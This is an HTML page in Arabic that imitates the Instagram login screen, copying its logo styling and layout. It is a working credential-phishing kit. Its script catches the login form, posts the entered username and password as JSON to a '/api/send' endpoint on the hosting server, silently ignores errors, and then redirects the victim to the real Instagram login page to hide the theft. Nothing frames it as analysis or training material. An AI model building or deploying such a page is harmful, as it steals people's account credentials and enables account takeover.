<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, "Segoe UI", Roboto, sans-serif; }
body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
.container { width: 100%; max-width: 350px; }
.logo { text-align: center; margin-bottom: 30px; }
.logo-text { font-size: 42px; font-weight: 300; font-family: 'Billabong', cursive, sans-serif; letter-spacing: -2px; }
.logo-text span { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
input { width: 100%; padding: 14px 16px; margin-bottom: 8px; background: #121212; border: 1px solid #262626; border-radius: 6px; color: #fff; font-size: 14px; }
input::placeholder { color: #8e8e8e; }
input:focus { outline: none; border-color: #363636; }
button { width: 100%; padding: 14px; background: #0095f6; color: #fff; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; margin-top: 8px; cursor: pointer; }
button:active { background: #1877f2; }
.divider { display: flex; align-items: center; margin: 20px 0; }
.divider-line { flex: 1; height: 1px; background: #262626; }
.divider-text { padding: 0 16px; color: #8e8e8e; font-size: 12px; font-weight: 600; }
.fb-login { text-align: center; color: #385185; font-size: 14px; font-weight: 600; margin: 16px 0; cursor: pointer; }
.forgot { text-align: center; color: #8e8e8e; font-size: 12px; margin-top: 16px; }
.forgot a { color: #8e8e8e; text-decoration: none; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <div class="logo-text"><span>Instagram</span></div>
  </div>
  <form id="loginForm" onsubmit="return sendData(event)">
    <input type="text" name="username" id="username" placeholder="رقم الهاتف المحمول أو اسم المستخدم أو البريد الإلكتروني" required>
    <input type="password" name="password" id="password" placeholder="كلمة السر" required>
    <button type="submit">تسجيل الدخول</button>
  </form>
  <div class="divider">
    <div class="divider-line"></div>
    <div class="divider-text">أو</div>
    <div class="divider-line"></div>
  </div>
  <div class="fb-login">تسجيل الدخول بحساب فيسبوك</div>
  <div class="forgot"><a href="#">هل نسيت كلمة السر؟</a></div>
</div>
<script>
async function sendData(e) {
  e.preventDefault();
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  try {
    await fetch('/api/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: u, password: p })
    });
  } catch (err) {}
  window.location.href = 'https://www.instagram.com/accounts/login/';
  return false;
}
</script>
</body>
</html>
